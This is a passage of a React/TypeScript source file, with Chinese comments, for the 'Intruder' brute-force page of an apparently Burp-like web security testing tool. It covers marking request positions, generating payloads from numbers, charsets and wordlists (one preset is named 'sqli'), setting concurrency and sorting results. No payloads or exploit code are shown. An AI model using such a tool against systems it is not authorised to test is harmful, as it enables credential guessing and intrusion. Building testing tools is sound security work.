        newRaw.push("");
      }
    });

    updateActiveTab({
      rawRequest: newText,
      positions: newPositions,
      rawPayloads: newRaw,
    });

    // 恢复光标选中位置（选中标记内的内容）
    setTimeout(() => {
      ta.focus();
      ta.selectionStart = start + 1;
      ta.selectionEnd = end + 1;
    }, 0);
  };

  // ===== 清除所有 §§ 标记 =====
  const handleClearMarks = () => {
    const cleared = activeTab.rawRequest.replace(/§/g, "");
    updateActiveTab({ rawRequest: cleared });
  };

  // ===== 预览生成 payload =====
  const openPreview = (idx: number) => {
    const pos = activeTab.positions[idx];
    if (!pos) return;
    const payloads = generatePayloadsForPosition(pos);
    setPreviewTitle(
      `§${pos.placeholder}§ 预览 — ${PAYLOAD_TYPE_LABELS[pos.payloadType]}（共 ${payloads.length} 个）`
    );
    setPreviewPayloads(payloads);
  };

  // ===== 导入外部字典文件（txt，每行一条） =====
  const fileInputRef = useRef<HTMLInputElement>(null);

  const handleImportWordlist = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    // 清空 value，允许连续导入同一个文件
    e.target.value = "";
    if (!file || !effectivePos) return;
    const reader = new FileReader();
    reader.onload = () => {
      const text = String(reader.result || "");
      // 按行拆分、去空行、去重（保留首次出现顺序）
      const seen = new Set<string>();
      const lines: string[] = [];
      for (const raw of text.split(/\r\n|\r|\n/)) {
        const line = raw.trim();
        if (!line || seen.has(line)) continue;
        seen.add(line);
        lines.push(line);
      }
      if (lines.length === 0) return;
      // 导入的内容是字面列表 → 切到 simple 类型并填充
      const newPositions = [...activeTab.positions];
      newPositions[effectiveIdx] = ensureDefaults({
        ...newPositions[effectiveIdx],
        payloadType: "simple",
        payloads: lines,
      });
      const newRaw = [...activeTab.rawPayloads];
      newRaw[effectiveIdx] = lines.join("\n");
      updateActiveTab({ positions: newPositions, rawPayloads: newRaw });
    };
    reader.readAsText(file);
  };

  // ===== 运行爆破 =====
  const handleRun = async () => {
    const parsed = parseRawRequest(activeTab.rawRequest, activeTab.scheme);
    if (!parsed || !parsed.url) {
      updateActiveTab({
        error: "无法解析请求，请检查格式（需要 Host 头和请求行）",
      });
      return;
    }

    if (activeTab.positions.length === 0) {
      updateActiveTab({
        error: "请先标记 payload 位置：在请求中选中文本后点击「添加 §」",
      });
      return;
    }

    // 根据每个位置的配置生成实际 payload
    const generated = activeTab.positions.map(
      (p) => ({
        placeholder: p.placeholder,
        payloads: generatePayloadsForPosition(p),
        payloadType: "simple" as PayloadType,
      })
    );

    let positionsWithPayloads: IntruderPosition[];
    if (isSinglePayloadMode) {
      // 单 payload 集模式（逐个测试/同步替换）：所有标记位共用第一个位置的
      // payload 集——后端 sniper 用它依次替换每个标记位，battering_ram 同步替换。
      // 此前未配置的位置 payload 为空会被拦截报错，且 UI 又只展示第一个位置的
      // 配置，导致多标记位时爆破根本无法运行。
      const shared = generated[0].payloads;
      if (shared.length === 0) {
        updateActiveTab({
          error: `payload §${generated[0].placeholder}§ 没有生成任何内容，请检查配置`,
        });
        return;
      }
      positionsWithPayloads = activeTab.positions.map((p) => ({
        placeholder: p.placeholder,
        payloads: shared,
        payloadType: "simple" as PayloadType,
      }));
    } else {
      const empty = generated.find((p) => p.payloads.length === 0);
      if (empty) {
        updateActiveTab({
          error: `payload §${empty.placeholder}§ 没有生成任何内容，请检查该标记位的配置`,
        });
        return;
      }
      positionsWithPayloads = generated;
    }

    setRunning(true);
    updateActiveTab({ error: null, result: null });
    try {
      const config: IntruderConfig = {
        method: parsed.method,
        url: parsed.url,
        headers: parsed.headers,
        body: parsed.body,
        positions: positionsWithPayloads,
        concurrency: activeTab.concurrency,
        project_id: currentProjectId,
        attack_type: activeTab.attackType,
      };
      // 后端立即返回 task_id，结果通过 WebSocket 逐个推送
      const result = await runIntruder(config);
      runningTaskIdRef.current = result.task_id;
      // 初始化空结果列表，WebSocket 事件会逐个追加
      updateActiveTab({
        result: { task_id: result.task_id, total: result.total, results: [] },
      });
      // running 状态由 intruder_complete 事件复位
      // 如果 WebSocket 断开，5 秒后自动复位作为兜底
      setTimeout(() => {
        if (runningTaskIdRef.current === result.task_id) {
          runningTaskIdRef.current = null;
          setRunning(false);
        }
      }, 60000);
    } catch (e) {
      updateActiveTab({ error: e instanceof Error ? e.message : "运行失败" });
      setRunning(false);
    }
  };

  // ===== 右键 → 发送到重放器 =====
  const handleSendResultToRepeater = useCallback(
    async (flowId: string) => {
      setContextMenu(null);
      try {
        const flow = await getFlow(flowId);
        sendToRepeater({
          method: flow.method,
          url: flow.url,
          headers: flow.req_headers || "",
          body: flow.req_body || "",
        });
        navigate("/repeater");
      } catch {
        // 静默处理
      }
    },
    [sendToRepeater, navigate]
  );

  // ===== 右键 → 发送到 AI 助手 =====
  const handleSendResultToAI = useCallback(
    async (flowId: string) => {
      setContextMenu(null);
      try {
        const flow = await getFlow(flowId);
        sendToAI({
          method: flow.method,
          url: flow.url,
          headers: flow.req_headers || "",
          body: flow.req_body || "",
          respStatus: flow.resp_status ?? undefined,
          respHeaders: flow.resp_headers || "",
          respBody: flow.resp_body || "",
        });
        navigate("/agent");
      } catch {
        // 静默处理
      }
    },
    [sendToAI, navigate]
  );

  // ===== 右键 → 发送到爆破器（自身，新标签页） =====
  const handleSendResultToIntruder = useCallback(
    async (flowId: string) => {
      setContextMenu(null);
      try {
        const flow = await getFlow(flowId);
        sendToIntruder({
          method: flow.method,
          url: flow.url,
          headers: flow.req_headers || "",
          body: flow.req_body || "",
        });
      } catch {
        // 静默处理
      }
    },
    [sendToIntruder]
  );

  // ===== 点击结果 → 内联显示数据包详情（复用 FlowDetailPanel） =====
  const handleResultClick = useCallback(
    async (flowId: string) => {
      // 同一个 flow 不重复加载
      if (selectedResultFlowIdRef.current === flowId && selectedResultFlow) return;
      selectedResultFlowIdRef.current = flowId;
      setSelectedResultLoading(true);
      setSelectedResultFlow(null);
      try {
        const flow = await getFlow(flowId);
        setSelectedResultFlow(flow);
      } catch {
        // 静默处理
      } finally {
        setSelectedResultLoading(false);
      }
    },
    [selectedResultFlow]
  );

  // ===== 排序逻辑 =====
  const handleSort = useCallback(
    (field: "number" | "payload" | "status" | "length" | "duration" | "mime") => {
      if (sortField === field) {
        setSortDir((prev) => (prev === "asc" ? "desc" : "asc"));
      } else {
        setSortField(field);
        setSortDir("asc");
      }
    },
    [sortField]
  );

  // ===== 选中结果的数据包内容（用于四宫格左下/右下） =====
  const selectedReqContent = useMemo(
    () => (selectedResultFlow ? buildRequestContent(selectedResultFlow) : ""),
    [selectedResultFlow]
  );
  const selectedRespContent = useMemo(
    () => (selectedResultFlow ? buildResponseContent(selectedResultFlow) : ""),
    [selectedResultFlow]
  );

  const sortedResults = useMemo(() => {
    if (!activeTab.result?.results) return [];
    const arr = [...activeTab.result.results];
    if (sortField === "number") {
      // 序号排序：asc = 原始顺序，desc = 反转
      if (sortDir === "desc") arr.reverse();
    } else {
      arr.sort((a, b) => {
        let cmp = 0;
        switch (sortField) {
          case "payload":
            // numeric: true 让数字字符串按数值排序（"2" < "10"）
            cmp = a.payload.localeCompare(b.payload, undefined, { numeric: true, sensitivity: "base" });
            break;
          case "status": {
            // null/错误排到最后
            const sa = a.status ?? -1;
            const sb = b.status ?? -1;
            cmp = sa - sb;
            break;
          }
          case "length":
            cmp = (a.length ?? 0) - (b.length ?? 0);
            break;
          case "duration":
            cmp = (a.duration_ms ?? 0) - (b.duration_ms ?? 0);
            break;
          case "mime":
            cmp = (a.mime_type ?? "").localeCompare(b.mime_type ?? "", undefined, { numeric: true });
            break;
        }
        return sortDir === "asc" ? cmp : -cmp;
      });
    }
    return arr;
  }, [activeTab.result, sortField, sortDir]);

  // ===== 请求编辑器右键 → 发送到重放器 =====
  const handleReqSendToRepeater = useCallback(() => {
    setReqContextMenu(null);
    const parsed = parseRawRequest(activeTab.rawRequest, activeTab.scheme);
    if (!parsed) return;
    sendToRepeater({
      method: parsed.method,
      url: parsed.url,
      headers: parsed.headers,
      body: parsed.body,
    });
    navigate("/repeater");
  }, [activeTab, sendToRepeater, navigate]);

  // ===== 请求编辑器右键 → 发送到爆破器（新标签页） =====
  const handleReqSendToIntruder = useCallback(() => {
    setReqContextMenu(null);
    const parsed = parseRawRequest(activeTab.rawRequest, activeTab.scheme);
    if (!parsed) return;
    sendToIntruder({
      method: parsed.method,
      url: parsed.url,
      headers: parsed.headers,
      body: parsed.body,
    });
  }, [activeTab, sendToIntruder]);

  // ===== 请求编辑器右键 → 发送到 AI =====
  const handleReqSendToAI = useCallback(() => {
    setReqContextMenu(null);
    const parsed = parseRawRequest(activeTab.rawRequest, activeTab.scheme);
    if (!parsed) return;
    sendToAI({
      method: parsed.method,
      url: parsed.url,
      headers: parsed.headers,
      body: parsed.body,
    });
    navigate("/agent");
  }, [activeTab, sendToAI, navigate]);

  // ===== 请求编辑器右键菜单外部点击关闭 =====
  useEffect(() => {
    if (!reqContextMenu) return;
    const handleClick = (e: MouseEvent) => {
      if (reqMenuRef.current && !reqMenuRef.current.contains(e.target as Node)) {
        setReqContextMenu(null);
      }
    };
    const handleScroll = () => setReqContextMenu(null);
    document.addEventListener("mousedown", handleClick);
    document.addEventListener("scroll", handleScroll, true);
    return () => {
      document.removeEventListener("mousedown", handleClick);
      document.removeEventListener("scroll", handleScroll, true);
    };
  }, [reqContextMenu]);

  // ===== 标签页切换时清空内联详情 =====
  useEffect(() => {
    setSelectedResultFlow(null);
    selectedResultFlowIdRef.current = null;
  }, [activeTabId]);

  // 生成 Tab 标题
  const getTabTitle = (tab: IntruderTab, idx: number) => {
    const parsed = parseRawRequest(tab.rawRequest, tab.scheme);
    if (parsed) {
      const path = parsed.url
        ? (() => {
            try {
              return new URL(parsed.url).pathname;
            } catch {
              return "/";
            }
          })()
        : "/";
      return `#${idx + 1} ${
        path.length > 20 ? path.substring(0, 20) + "..." : path
      }`;
    }
    return `#${idx + 1} 空请求`;
  };

  // 根据当前 payload 类型渲染动态配置 UI
  const renderTypeConfig = (pos: IntruderPosition, idx: number) => {
    const inputStyle: React.CSSProperties = { width: 80 };
    const labelStyle: React.CSSProperties = {
      fontSize: 11,
      color: "var(--text-muted)",
      whiteSpace: "nowrap",
    };

    switch (pos.payloadType) {
      case "numbers":
        return (
          <div
            style={{
              display: "flex",
              gap: 8,
              alignItems: "center",
              flexWrap: "wrap",
            }}
          >
            <span style={labelStyle}>从</span>
            <input
              className="input"
              type="number"
              style={inputStyle}
              value={pos.numFrom ?? 0}
              onChange={(e) =>
                handlePositionFieldChange(idx, {
                  numFrom: parseInt(e.target.value, 10) || 0,
                })
              }
            />
            <span style={labelStyle}>到</span>
            <input
              className="input"
              type="number"
              style={inputStyle}
              value={pos.numTo ?? 0}
              onChange={(e) =>
                handlePositionFieldChange(idx, {
                  numTo: parseInt(e.target.value, 10) || 0,
                })
              }
            />
            <span style={labelStyle}>步长</span>
            <input
              className="input"
              type="number"
              style={{ width: 60 }}
              value={pos.numStep ?? 1}
              onChange={(e) =>
                handlePositionFieldChange(idx, {
                  numStep: parseInt(e.target.value, 10) || 1,
                })
              }
            />
          </div>
        );

      case "dates":
        return (
          <div
            style={{
              display: "flex",
              gap: 8,
              alignItems: "center",
              flexWrap: "wrap",
            }}
          >
            <span style={labelStyle}>从</span>
            <input
              className="input"
              type="date"
              style={inputStyle}
              value={pos.dateFrom ?? ""}
              onChange={(e) =>
                handlePositionFieldChange(idx, { dateFrom: e.target.value })
              }
            />
            <span style={labelStyle}>到</span>
            <input
              className="input"
              type="date"
              style={inputStyle}
              value={pos.dateTo ?? ""}
              onChange={(e) =>
                handlePositionFieldChange(idx, { dateTo: e.target.value })
              }
            />
            <span style={labelStyle}>格式</span>
            <input
              className="input"
              style={{ width: 130 }}
              placeholder="YYYY-MM-DD"
              value={pos.dateFormat ?? "YYYY-MM-DD"}
              onChange={(e) =>
                handlePositionFieldChange(idx, { dateFormat: e.target.value })
              }
            />
          </div>
        );

      case "uuid":
        return (
          <div
            style={{
              display: "flex",
              gap: 8,
              alignItems: "center",
              flexWrap: "wrap",
            }}
          >
            <span style={labelStyle}>生成数量</span>
            <input
              className="input"
              type="number"
              style={inputStyle}
              min={1}
              value={pos.randCount ?? 10}
              onChange={(e) =>
                handlePositionFieldChange(idx, {
                  randCount: parseInt(e.target.value, 10) || 1,
                })
              }
            />
          </div>
        );

      case "random":
        return (
          <div
            style={{
              display: "flex",
              gap: 8,
              alignItems: "center",
              flexWrap: "wrap",
            }}
          >
            <span style={labelStyle}>数量</span>
            <input
              className="input"
              type="number"
              style={{ width: 60 }}
              min={1}
              value={pos.randCount ?? 10}
              onChange={(e) =>
                handlePositionFieldChange(idx, {
                  randCount: parseInt(e.target.value, 10) || 1,
                })
              }
            />
            <span style={labelStyle}>长度</span>
            <input
              className="input"
              type="number"
              style={{ width: 60 }}
              min={1}
              value={pos.randLength ?? 8}
              onChange={(e) =>
                handlePositionFieldChange(idx, {
                  randLength: parseInt(e.target.value, 10) || 1,
                })
              }
            />
            <span style={labelStyle}>字符集</span>
            <input
              className="input"
              style={{ width: 220 }}
              value={pos.randCharset ?? "abcdefghijklmnopqrstuvwxyz0123456789"}
              onChange={(e) =>
                handlePositionFieldChange(idx, { randCharset: e.target.value })
              }
            />
          </div>
        );

      case "brute":
        return (
          <div
            style={{
              display: "flex",
              gap: 8,
              alignItems: "center",
              flexWrap: "wrap",
            }}
          >
            <span style={labelStyle}>字符集</span>
            <input
              className="input"
              style={{ width: 160 }}
              value={pos.bruteCharset ?? "abc"}
              onChange={(e) =>
                handlePositionFieldChange(idx, { bruteCharset: e.target.value })
              }
            />
            <span style={labelStyle}>最小长度</span>
            <input
              className="input"
              type="number"
              style={{ width: 70 }}
              min={1}
              value={pos.bruteMinLen ?? 1}
              onChange={(e) =>
                handlePositionFieldChange(idx, {
                  bruteMinLen: parseInt(e.target.value, 10) || 1,
                })
              }
            />
            <span style={labelStyle}>最大长度</span>
            <input
              className="input"
              type="number"
              style={{ width: 70 }}
              min={1}
              value={pos.bruteMaxLen ?? 3}
              onChange={(e) =>
                handlePositionFieldChange(idx, {
                  bruteMaxLen: parseInt(e.target.value, 10) || 1,
                })
              }
            />
          </div>
        );

      case "wordlist":
        return (
          <div
            style={{
              display: "flex",
              gap: 8,
              alignItems: "center",
              flexWrap: "wrap",
            }}
          >
            <span style={labelStyle}>字典</span>
            <select
              className="select"
              style={{ width: 180 }}
              value={pos.wordlistPreset ?? "sqli"}
              onChange={(e) =>
                handlePositionFieldChange(idx, {
                  wordlistPreset: e.target.value as WordlistPreset,
                })
              }
            >
              {(Object.keys(WORDLIST_LABELS) as WordlistPreset[]).map((k) => (
                <option key={k} value={k}>
                  {WORDLIST_LABELS[k]} ({BUILTIN_WORDLISTS[k].length})
                </option>
              ))}
            </select>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <div className="flex flex-col h-full">
      <style>{`
        .col-resize-handle:hover .col-resize-line,
        .col-resize-handle.active .col-resize-line {
          background: var(--accent-blue) !important;
          box-shadow: 0 0 4px var(--accent-blue);
        }
      `}</style>
      <div className="view-header">
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <span className="view-title">爆破器</span>
          <div
            style={{
              display: "flex",
              gap: 0,
              borderRadius: 4,
              overflow: "hidden",
              border: "1px solid var(--border-default)",
            }}
          >
            <button
              style={{
                padding: "2px 10px",
                fontSize: 11,
                background:
                  activeTab.scheme === "http"
                    ? "var(--accent-blue)"
                    : "var(--bg-tertiary)",
                color:
                  activeTab.scheme === "http" ? "#fff" : "var(--text-secondary)",
                border: "none",
                cursor: "pointer",
              }}
              onClick={() => updateActiveTab({ scheme: "http" })}
            >
              HTTP
            </button>
            <button
              style={{
                padding: "2px 10px",
                fontSize: 11,
                background:
                  activeTab.scheme === "https"
                    ? "var(--accent-blue)"
                    : "var(--bg-tertiary)",
                color:
                  activeTab.scheme === "https"
                    ? "#fff"
                    : "var(--text-secondary)",
                border: "none",
                cursor: "pointer",
              }}
              onClick={() => updateActiveTab({ scheme: "https" })}
            >
              HTTPS
            </button>
          </div>
          {/* 攻击类型选择器 */}
          <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
            <span className="text-xs text-muted">攻击类型:</span>
            <select
              className="select"
              style={{ width: 150 }}
              value={activeTab.attackType}
              onChange={(e) =>
                updateActiveTab({
                  attackType: e.target.value as IntruderTab["attackType"],
                })
              }
            >
              {ATTACK_TYPES.map((a) => (
                <option key={a.value} value={a.value} title={a.desc}>
                  {a.label}
                </option>
              ))}
            </select>
          </div>
        </div>
      </div>

      {/* 多标签栏 */}
      <div className="multi-tab-bar">
        {tabs.map((tab, idx) => (
          <div
            key={tab.id}
            className={`multi-tab ${tab.id === activeTabId ? "active" : ""}`}
            onClick={() => setActiveTabId(tab.id)}
          >
            <span className="multi-tab-title">{getTabTitle(tab, idx)}</span>
            {tabs.length > 1 && (
              <button
                className="multi-tab-close"
                onClick={(e) => handleCloseTab(e, tab.id)}
              >
                <X size={11} />
              </button>
            )}
          </div>
        ))}
        <button className="multi-tab-add" onClick={handleAddTab} title="新建标签页">
          <Plus size={13} />
        </button>
      </div>

      {/* ===== 四宫格布局 ===== */}
      <div style={{ flex: 1, overflow: "hidden" }}>
        <SplitPane
          direction="horizontal"
          initialSplit={0.5}
          minSize={200}
          storageKey="intruder_center_split"
          first={
            // 左列：请求编辑器(上) + 请求详情(下)
            <SplitPane
              direction="vertical"
              initialSplit={0.5}
              minSize={80}
              storageKey="intruder_left_vsplit"
              first={
                <div
                  style={{
                    height: "100%",
                    width: "100%",
                    display: "flex",
                    flexDirection: "column",
                    overflow: "hidden",
                  }}
                  onContextMenu={(e) => {
                    e.preventDefault();
                    setReqContextMenu({ x: e.clientX, y: e.clientY });
                  }}
                >
          {/* 请求编辑器头部 + 标记按钮 */}
          <div
            style={{
              padding: "4px 12px",
              borderBottom: "1px solid var(--border-default)",
              background: "var(--bg-secondary)",
              display: "flex",
              alignItems: "center",
              gap: 8,
              fontSize: 11,
              color: "var(--text-muted)",
            }}
          >
            <span>请求</span>
            <div style={{ flex: 1 }} />
            <button className="btn btn-sm" onClick={handleReqSendToRepeater} title="发送到重放器">
              <Repeat size={10} /> 重放器
            </button>
            <button className="btn btn-sm" onClick={handleReqSendToAI} title="发送到 AI 助手">
              <Bot size={10} /> AI
            </button>
            <button
              className="btn btn-sm"
              onClick={handleMarkSelection}
              title="选中文本后点击，添加 §§ 标记"
            >
              <Crosshair size={10} /> 添加 §
            </button>
            {!hasSelection && (
              <span style={{ fontSize: 10, color: "var(--text-muted)" }}>
                选中文字后点击添加标记
              </span>
            )}
            <button
              className="btn btn-sm"
              onClick={handleClearMarks}
              title="清除所有 §§ 标记"
            >
              <Eraser size={10} /> 清除
            </button>
            <button
              className="btn btn-sm btn-primary"
              onClick={handleRun}
              disabled={running || !activeTab.rawRequest.trim()}
            >
              {running ? <Spinner size={12} /> : <Play size={12} />}
              {running ? "运行中..." : "开始攻击"}
            </button>
          </div>

          {/* 原始请求编辑器 */}
          <div style={{ flex: 1, overflow: "hidden", display: "flex", borderBottom: "1px solid var(--border-default)" }}>
            <CodeEditor
              value={activeTab.rawRequest}
              onChange={(val) => updateActiveTab({ rawRequest: val })}
              type="request"
              editable
              externalTextareaRef={requestTextareaRef}
              onSelectionChange={setHasSelection}
            />
          </div>
                </div>
              }
              second={
                <div style={{ height: "100%", width: "100%", display: "flex", flexDirection: "column", overflow: "hidden" }}>
                  <div style={{ padding: "4px 12px", borderBottom: "1px solid var(--border-default)", background: "var(--bg-secondary)", fontSize: 11, color: "var(--text-muted)", flexShrink: 0, display: "flex", alignItems: "center", gap: 8 }}>
                    <span>Payload 管理</span>
                  </div>

          {/* Payload 列表标题 */}
          <div
            style={{
              padding: "8px 12px",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
            }}
          >
            <span className="text-xs text-muted">
              {isSinglePayloadMode
                ? "Payload"
                : `Payload ${activeTab.positions.length > 0 ? `(${activeTab.positions.length})` : ""}`}
            </span>
          </div>

          {/* Payload 标签（始终显示：多 payload 模式下可切换配置，单 payload 模式下作位置指示） */}
          <div
            style={{
              display: "flex",
              padding: "0 12px 8px",
              gap: 4,
              flexWrap: "wrap",
              minHeight: 8,
            }}
          >
            {activeTab.positions.map((p, idx) => {
              const active = !isSinglePayloadMode && selectedIdx === idx;
              return (
                <div
                  key={idx}
                  title={
                    isSinglePayloadMode
                      ? "当前攻击类型所有标记位共用同一个 payload 集（下方配置）"
                      : `配置 §${p.placeholder}§ 的 payload`
                  }
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: 4,
                    padding: "3px 8px",
                    borderRadius: 4,
                    cursor: isSinglePayloadMode ? "inherit" : "pointer",
                    background: active ? "var(--bg-active)" : "var(--bg-tertiary)",
                    border: active
                      ? "1px solid var(--accent-blue)"
                      : "1px solid var(--border-default)",
                    fontSize: 11,
                    fontFamily: "var(--font-mono)",
                  }}
                  onClick={
                    isSinglePayloadMode
                      ? undefined
                      : () => updateActiveTab({ selectedPositionIdx: idx })
                  }
                >
                  {p.placeholder}
                  <button
                    style={{
                      background: "none",
                      border: "none",
                      color: "var(--text-muted)",
                      cursor: "pointer",
                      padding: 0,
                      marginLeft: 2,
                      display: "flex",
                      alignItems: "center",
                    }}
                      onClick={(e) => {
                        e.stopPropagation();
                        handleRemovePosition(idx);
                      }}
                    title="移除该标记（保留原文，去掉 §）"
                  >
                      <Trash2 size={10} />
                    </button>
                </div>
              );
            })}
          </div>
          {isSinglePayloadMode && activeTab.positions.length > 1 && (
            <div
              className="text-xs text-muted"
              style={{ padding: "0 12px 8px", fontSize: 10, lineHeight: 1.5 }}
            >
              「{ATTACK_TYPES.find((a) => a.value === activeTab.attackType)?.label}」模式下所有标记位共用下方同一个 payload 集；如需为每个标记位单独配置 payload，请切换攻击类型为「并行配对」或「全组合」
            </div>
          )}

          {/* Selected position config */}
          <div
            style={{
              flex: 1,
              minHeight: 0,
              display: "flex",
              flexDirection: "column",
              overflow: "hidden",
              borderTop: "1px solid var(--border-default)",
            }}
          >
            {/* Payload 配置 + 类型 + 预览/AI */}
            {effectivePos ? (
              <>
            <div
              style={{
                padding: "8px 12px",
                display: "flex",
                gap: 8,
                alignItems: "center",
                flexWrap: "wrap",
                borderBottom: "1px solid var(--border-subtle)",
              }}
            >
              {!isSinglePayloadMode && (
                <span
                  style={{
                    fontSize: 11,
                    fontFamily: "var(--font-mono)",
                    padding: "2px 8px",
                    borderRadius: 4,
                    background: "var(--bg-active)",
                    border: "1px solid var(--accent-blue)",
                    color: "var(--accent-blue)",
                  }}
                >
                  {effectivePos?.placeholder}
                </span>
              )}
              <span className="text-xs text-muted">类型:</span>
              <select
                className="select"
                style={{ width: 140 }}
                value={effectivePos?.payloadType ?? "simple"}
                onChange={(e) =>
                  handlePayloadTypeChange(
                    effectiveIdx,
                    e.target.value as PayloadType
                  )
                }
              >
                {(Object.keys(PAYLOAD_TYPE_LABELS) as PayloadType[]).map((t) => (
                  <option key={t} value={t}>
                    {PAYLOAD_TYPE_LABELS[t]}
                  </option>
                ))}
              </select>
              <div style={{ flex: 1 }} />
              <button
                className="btn btn-sm"
                onClick={() => fileInputRef.current?.click()}
                title="导入外部字典文件（txt，每行一条，自动去空行去重）"
              >
                <Upload size={10} /> 导入字典
              </button>
              <input
                ref={fileInputRef}
                type="file"
                accept=".txt,.dic,.list,.csv,text/plain"
                style={{ display: "none" }}
                onChange={handleImportWordlist}
              />
              <button
                className="btn btn-sm"
                onClick={() => openPreview(effectiveIdx)}
                title="预览生成的 payload"
              >
                <Eye size={10} /> 预览
              </button>
            </div>

            {/* 动态配置区（非 simple 类型） */}
            {effectivePos && effectivePos.payloadType !== "simple" && (
              <div
                style={{
                  padding: "8px 12px",
                  borderBottom: "1px solid var(--border-subtle)",
                }}
              >
                {renderTypeConfig(effectivePos, effectiveIdx)}
              </div>
            )}

            {/* Payload 列表区 */}
            {effectivePos?.payloadType === "simple" ? (
              <textarea
                className="http-editor"
                style={{
                  flex: 1,
                  minHeight: 120,
                  margin: 0,
                  borderRadius: 0,
                  border: "none",
                  resize: "none",
                  padding: 12,
                  fontSize: 13,
                  lineHeight: 1.6,
                }}
                value={activeTab.rawPayloads[effectiveIdx] || ""}
                onChange={(e) =>
                  handlePayloadsChange(effectiveIdx, e.target.value)
                }
              />
            ) : (
              <div
                className="scroll-container"
                style={{
                  flex: 1,
                  minHeight: 120,
                  margin: 0,
                  border: "none",
                  borderRadius: 0,
                  background: "var(--bg-primary)",
                  overflow: "auto",
                  padding: 12,
                }}
              >
                {generatedPayloads.length === 0 ? (
                  <div
                    className="text-xs text-muted"
                    style={{ padding: 8 }}
                  >
                    无 payload
                  </div>
                ) : (
                  <>
                    {generatedPayloads.slice(0, 500).map((p, i) => (
                      <div
                        key={i}
                        style={{
                          padding: "2px 10px",
                          fontFamily: "var(--font-mono)",
                          fontSize: 11,
                          borderBottom: "1px solid var(--border-subtle)",
                          color: "var(--text-primary)",
                          whiteSpace: "nowrap",
                          overflow: "hidden",
                          textOverflow: "ellipsis",
                        }}
                      >
                        {p}
                      </div>
                    ))}
                    {generatedPayloads.length > 500 && (
                      <div
                        className="text-xs text-muted"
                        style={{ padding: 8 }}
                      >
                        ... 仅显示前 500 条，共 {generatedPayloads.length} 条
                      </div>
                    )}
                  </>
                )}
              </div>
            )}
              </>
            ) : (
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "var(--text-muted)",
                  fontSize: 12,
                  padding: 24,
                }}
              >
                在上方请求中选中文字并点击「添加 §」标记 payload 位置
              </div>
            )}
          </div>

          {/* Concurrency */}
          <div
            style={{
              padding: "8px 12px",
              borderTop: "1px solid var(--border-default)",
              display: "flex",
              alignItems: "center",
              gap: 8,
            }}
          >
            <span className="text-xs text-muted">并发数:</span>
            <input
              className="input"
              type="number"
              style={{ width: 60 }}
              min={1}
              max={50}
              value={activeTab.concurrency}
              onChange={(e) =>
                updateActiveTab({
                  concurrency: parseInt(e.target.value, 10) || 5,
                })
              }
            />
          </div>
                </div>
              }
            />
          }
          second={
            // 右列：结果列表(上) + 响应详情(下)
            <SplitPane
              direction="vertical"
              initialSplit={0.5}
              minSize={80}
              storageKey="intruder_right_vsplit"
              first={
                <div style={{ display: "flex", flexDirection: "column", height: "100%", width: "100%", overflow: "hidden" }}>
          {activeTab.error && (
            <div
              style={{
                padding: 12,
                color: "var(--accent-red)",
                borderBottom: "1px solid var(--border-default)",
                background: "rgba(248,81,73,0.08)",
              }}
            >
              {activeTab.error}
            </div>
          )}

          {!activeTab.result && !activeTab.error && (
            <EmptyState
              icon={<Inbox />}
              message="配置 Payload 后点击「开始攻击」查看结果"
            />
          )}

          {activeTab.result && (
                    <>
                  {/* 结果统计栏 */}
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: 12,
                      padding: "6px 12px",
                      borderBottom: "1px solid var(--border-default)",
                      background: "var(--bg-secondary)",
                      flexShrink: 0,
                    }}
                  >
                    <span className="text-sm">
                      共 {activeTab.result.total} 个结果
                    </span>
                    <span className="text-xs text-muted">
                      Task: {activeTab.result.task_id.substring(0, 8)}...
                    </span>
                  </div>

                  {/* 可排序表头 — 可拖动列宽 */}
                  <div
                    style={{
                      display: "grid",
                      gridTemplateColumns: RESULT_COLUMNS.map((c) => `${resultColWidths[c.id] ?? c.width}px`).join(" "),
                      gap: 8,
                      padding: "6px 12px",
                      fontSize: 10,
                      fontWeight: 600,
                      textTransform: "uppercase",
                      letterSpacing: 0.5,
                      color: "var(--text-secondary)",
                      background: "var(--bg-secondary)",
                      borderBottom: "1px solid var(--border-default)",
                      flexShrink: 0,
                      userSelect: "none",
                      minWidth: resultTotalWidth + 8 * (RESULT_COLUMNS.length - 1) + 24,
                    }}
                  >
                    {RESULT_COLUMNS.map((col) => (
                      <div key={col.id} style={{ position: "relative", display: "flex", alignItems: "center", justifyContent: col.id === "status" || col.id === "number" ? "center" : undefined }}>
                        {col.id === "tags" ? (
                          <span>{col.label}</span>
                        ) : (
                          <SortableHeader label={col.label} field={col.id as "number" | "payload" | "status" | "length" | "duration" | "mime"} sortField={sortField} sortDir={sortDir} onSort={handleSort} />
                        )}
                        <div
                          className={`col-resize-handle${resizingCol === col.id ? " active" : ""}`}
                          onMouseDown={(e) => startColResize(e, col.id)}
                          style={{
                            position: "absolute", right: -4, top: -6, bottom: -6, width: 6,
                            cursor: "col-resize", zIndex: 2,
                            display: "flex", alignItems: "center", justifyContent: "center",
                          }}
                        >
                          <span className="col-resize-line" style={{ display: "block", width: 1, height: "60%", background: "var(--border-default)" }} />
                        </div>
                      </div>
                    ))}
                  </div>

                  {/* 结果列表 */}
                  <div className="scroll-container" style={{ flex: 1, overflow: "auto", overflowX: "auto" }}>
                    {sortedResults.map((r, i) => {
                      const isActive = selectedResultFlowIdRef.current === r.flow_id;
                      return (
                        <div
                          key={i}
                          className="intruder-result-row"
                          style={{
                            cursor: r.flow_id ? "pointer" : "inherit",
                            gridTemplateColumns: RESULT_COLUMNS.map((c) => `${resultColWidths[c.id] ?? c.width}px`).join(" "),
                            minWidth: resultTotalWidth + 8 * (RESULT_COLUMNS.length - 1) + 24,
                            background: isActive ? "var(--bg-active)" : undefined,
                          }}
                          onClick={() => {
                            if (r.flow_id) {
                              handleResultClick(r.flow_id);
                            }
                          }}
                          onContextMenu={(e) => {
                            if (!r.flow_id) return;
                            e.preventDefault();
                            e.stopPropagation();
                            setContextMenu({
                              x: e.clientX,
                              y: e.clientY,
                              flowId: r.flow_id,
                            });
                          }}
                        >
                          <span style={{ color: "var(--text-muted)", textAlign: "center", fontSize: 10 }}>{i + 1}</span>
